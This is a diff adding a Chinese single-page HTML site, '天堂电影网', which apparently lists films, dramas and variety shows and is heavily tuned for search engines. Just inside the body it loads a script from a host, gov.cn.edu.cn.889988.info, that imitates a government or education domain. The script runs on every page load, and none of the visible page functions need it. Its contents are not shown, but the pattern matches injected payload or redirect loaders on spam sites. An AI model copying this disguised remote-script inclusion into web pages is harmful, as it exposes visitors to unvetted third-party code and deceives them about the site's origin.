@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>天堂电影网 - 院线佳片/经典重映/影史殿堂导航</title>
+<meta name="description" content="天堂电影网(tiantangAVdianyingwang-h5.github.io)整理院线佳片、经典重映、热播剧集与综艺片单，移动端自适应，影视信息导航站。">
+<meta name="keywords" content="天堂电影网,院线佳片,经典重映,影史殿堂,热播剧集,在线观看">
+<meta name="author" content="天堂电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="天堂电影网 - 光影殿堂">
+<meta property="og:description" content="天堂电影网整理院线佳片、经典重映、热播剧集与综艺片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://tiantangAVdianyingwang-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;background:#0b1026;color:#eaf2ff;line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+.hall-bar{position:sticky;top:0;z-index:999;background:rgba(11,16,38,.95);border-bottom:1px solid #2a2f55;padding:.6rem .9rem}
+.hall-top{display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:1.08rem;font-weight:900}
+.brand b{color:#ffd479;text-shadow:0 0 10px rgba(255,212,121,.5)}
+.brand i{color:#9db4ff;font-style:normal}
+.cense{font-size:.7rem;color:#9db4ff}
+.cense b{color:#ffd479}
+.incense{height:3px;background:#2a2f55;border-radius:3px;margin-top:.5rem;overflow:hidden}
+.incense i{display:block;height:100%;width:20%;background:linear-gradient(90deg,#ffd479,#9db4ff);border-radius:3px;transition:.3s}
+.tabs{display:flex;gap:.35rem;margin-top:.55rem;overflow-x:auto}
+.tabs a{font-size:.74rem;padding:.32rem .72rem;white-space:nowrap;border-radius:18px 18px 4px 4px;border:1px solid #2a2f55;color:#aab6e8;transition:.25s}
+.tabs a.active,.tabs a:hover{background:linear-gradient(135deg,#ffd479,#ff9d5c);color:#0b1026;font-weight:700;border-color:transparent}
+.wrap{padding:1rem;max-width:1080px;margin:0 auto}
+.shrine{display:none;animation:rise .4s ease}
+.shrine.active{display:block}
+@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.shrine h2{font-size:1.22rem;color:#ffd479;margin:0 0 1rem;padding-left:.5rem;border-left:4px solid #9db4ff}
+#home .dome{background:radial-gradient(120% 130% at 80% -10%,#1b2350,#0b1026 60%);border:1px solid #2a2f55;border-radius:18px;padding:1.6rem;margin-bottom:1rem;position:relative;overflow:hidden}
+#home .dome:before{content:"🏛️";position:absolute;right:-6px;top:-10px;font-size:6rem;opacity:.1}
+#home .dome h1{font-size:1.7rem;color:#ffd479;margin-bottom:.4rem}
+#home .dome h1 span{color:#9db4ff}
+#home .dome p{font-size:.86rem;color:#aab6e8}
+.holy{display:grid;grid-template-columns:repeat(3,1fr);gap:.7rem;margin-top:1rem}
+.holy div{background:#121a3a;border:1px solid #2a2f55;border-radius:12px;padding:.9rem;text-align:center}
+.holy h3{color:#ffd479;font-size:1.05rem}
+.holy p{font-size:.68rem;color:#7e8bc0}
+.glass{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:.8rem}
+.glass .card{background:#121a3a;border:1px solid #2a2f55;border-radius:14px;overflow:hidden;position:relative;transition:.25s}
+.glass .card:hover{transform:translateY(-4px);box-shadow:0 10px 24px rgba(255,212,121,.18);border-color:#ffd479}
+.glass .art{height:108px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;color:#0b1026}
+.glass .gold{background:linear-gradient(135deg,#ffd479,#ff9d5c)}
+.glass .blue{background:linear-gradient(135deg,#9db4ff,#5b7bff)}
+.glass .dim{background:linear-gradient(135deg,#2a2f55,#121a3a);color:#eaf2ff}
+.glass .body{padding:.6rem}
+.glass h3{font-size:.84rem;color:#f3f7ff;margin-bottom:.15rem}
+.glass span{font-size:.68rem;color:#7e8bc0}
+.glass .crown{position:absolute;top:6px;left:6px;background:#0b1026cc;color:#ffd479;font-size:.6rem;padding:.15rem .4rem;border-radius:5px;font-weight:700}
+.corridor{display:flex;flex-direction:column;gap:.8rem}
+.corridor .row{display:flex;gap:.8rem;background:#121a3a;border:1px solid #2a2f55;border-left:4px solid #ffd479;border-radius:12px;padding:.9rem}
+.corridor .pill{width:38px;height:38px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#ffd479,#9db4ff);font-size:1rem}
+.corridor h3{font-size:.92rem;color:#f3f7ff;margin-bottom:.2rem}
+.corridor p{font-size:.74rem;color:#aab6e8}
+.corridor .eps span{display:inline-block;background:#2a2f55;color:#9db4ff;font-size:.66rem;padding:.18rem .5rem;border-radius:6px;margin:.25rem .25rem 0 0}
+.river{display:flex;gap:.6rem;overflow-x:auto;padding-bottom:.4rem}
+.river::-webkit-scrollbar{height:5px}.river::-webkit-scrollbar-thumb{background:#2a2f55;border-radius:5px}
+.river .star{min-width:158px;background:#121a3a;border:1px solid #2a2f55;border-radius:12px;padding:.9rem;text-align:center}
+.river .star .e{font-size:1.5rem}
+.river h3{font-size:.84rem;color:#ffd479;margin:.3rem 0 .15rem}
+.river p{font-size:.7rem;color:#7e8bc0}
+.about-hall{background:radial-gradient(120% 120% at 20% 0%,#1b2350,#0b1026);border:1px solid #ffd479;border-radius:18px;padding:1.5rem}
+.about-hall h2{color:#ffd479;border:0;padding:0;margin-bottom:.8rem}
+.about-hall p{font-size:.85rem;color:#aab6e8;margin-bottom:.6rem}
+.about-hall .info{margin-top:1rem;background:#121a3a;border:1px dashed #9db4ff;border-radius:12px;padding:1rem}
+.about-hall .info h3{color:#9db4ff;margin-bottom:.4rem}
+.about-hall .info p{font-size:.78rem;color:#7e8bc0}
+.foot{text-align:center;padding:1.4rem 1rem;border-top:1px solid #2a2f55;margin-top:1.6rem;font-size:.72rem;color:#4f5a8a}
+@media(max-width:768px){.holy{grid-template-columns:1fr}.glass{grid-template-columns:repeat(2,1fr)}.brand{font-size:.95rem}#home .dome h1{font-size:1.38rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="hall-bar">
+  <div class="hall-top">
+    <div class="brand">天堂<b>电影网</b> <i>🏛️</i></div>
+    <div class="cense">影史殿堂 · <b>常亮</b></div>
+  </div>
+  <div class="incense"><i id="burn"></i></div>
+  <nav class="tabs">
+    <a href="#" class="tab active" data-s="home">殿堂首页</a>
+    <a href="#" class="tab" data-s="movie">院线佳片</a>
+    <a href="#" class="tab" data-s="drama">经典剧集</a>
+    <a href="#" class="tab" data-s="show">星河综艺</a>
+    <a href="#" class="tab" data-s="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <section id="home" class="shrine active">
+    <div class="dome">
+      <h1>天堂<span>电影网</span></h1>
+      <p>像走进一座光影殿堂：院线佳片、经典重映、热播剧集、星河综艺，一廊一廊往下看。</p>
+      <div class="holy">
+        <div><h3>院线</h3><p>新片 / 大片 / 首映</p></div>
+        <div><h3>重映</h3><p>胶片 / 修复 / 影史</p></div>
+        <div><h3>连播</h3><p>剧集 / 综艺 / 纪录片</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="movie" class="shrine">
+    <h2>🎬 院线佳片 · 琉璃卡片墙</h2>
+    <div class="glass">
+      <div class="card"><div class="crown">首映</div><div class="art gold">史诗</div><div class="body"><h3>诸神黄昏录</h3><span>史诗 / 战争 / 2026</span></div></div>
+      <div class="card"><div class="crown">4K</div><div class="art blue">科幻</div><div class="body"><h3>银河回音</h3><span>科幻 / 太空</span></div></div>
+      <div class="card"><div class="crown">修复</div><div class="art dim">文艺</div><div class="body"><h3>雨季书店</h3><span>文艺 / 治愈</span></div></div>
+      <div class="card"><div class="crown">热推</div><div class="art gold">悬疑</div><div class="body"><h3>第九重门</h3><span>悬疑 / 密室</span></div></div>
+      <div class="card"><div class="crown">HD</div><div class="art blue">动画</div><div class="body"><h3>山海灯谜</h3><span>动画 / 奇幻</span></div></div>
+      <div class="card"><div class="crown">经典</div><div class="art dim">黑帮</div><div class="body"><h3>旧城暮色</h3><span>黑帮 / 年代</span></div></div>
+    </div>
+  </section>
+
+  <section id="drama" class="shrine">
+    <h2>📜 经典剧集 · 长廊时间线</h2>
+    <div class="corridor">
+      <div class="row"><div class="pill">🕰️</div><div><h3>长安夜行录</h3><p>大唐夜禁之下，捕快与胡商在坊门间追一桩失踪案。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span></div></div></div>
+      <div class="row"><div class="pill">🎭</div><div><h3>剧院巷11号</h3><p>一座老剧院后台，三代演员各自的谢幕与登场。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span></div></div></div>
+      <div class="row"><div class="pill">🚢</div><div><h3>远洋调度</h3><p>邮轮失联三小时，乘客里每个人都藏着一个航线外的理由。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span><span>第5集</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="show" class="shrine">
+    <h2>🌌 星河综艺 · 横滑星带</h2>
+    <div class="river">
+      <div class="star"><div class="e">🎙️</div><h3>殿堂金曲夜</h3><p>老歌重唱不修音</p></div>
+      <div class="star"><div class="e">🍷</div><h3>电影级晚宴</h3><p>用一部电影做一桌菜</p></div>
+      <div class="star"><div class="e">🎬</div><h3>导演急诊室</h3><p>烂片现场救场</p></div>
+      <div class="star"><div class="e">🪐</div><h3>宇宙漫游谈</h3><p>科学家聊科幻</p></div>
+      <div class="star"><div class="e">🎨</div><h3>胶片修复师</h3><p>把老电影擦亮</p></div>
+    </div>
+  </section>
+
+  <section id="about" class="shrine">
+    <div class="about-hall">
+      <h2>关于 天堂电影网</h2>
+      <p>天堂电影网是一个“光影殿堂式”影视导航站，整理院线佳片、经典重映、热播剧集与星河综艺片单。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。</p>
+      <p>本站仅做影视信息展示与分类导航，不提供盗版资源，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="info">
+        <h3>站点信息</h3>
+        <p>网站名称：天堂电影网</p>
+        <p>网址：https://tiantangAVdianyingwang-h5.github.io</p>
+        <p>关键词：天堂电影网、院线佳片、经典重映、影史殿堂、热播剧集</p>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <p>© 2024 天堂电影网 | https://tiantangAVdianyingwang-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+var tabs=document.querySelectorAll('.tab');
+tabs.forEach(function(t){
+  t.addEventListener('click',function(e){
+    e.preventDefault();
+    var s=this.dataset.s;
+    document.querySelectorAll('.shrine').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(s).classList.add('active');
+    tabs.forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    var n=Array.from(tabs).indexOf(this)+1;
+    document.getElementById('burn').style.width=(n/tabs.length*100)+'%';
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+document.getElementById('burn').style.width='20%';
+</script>
+</body>
+</html>
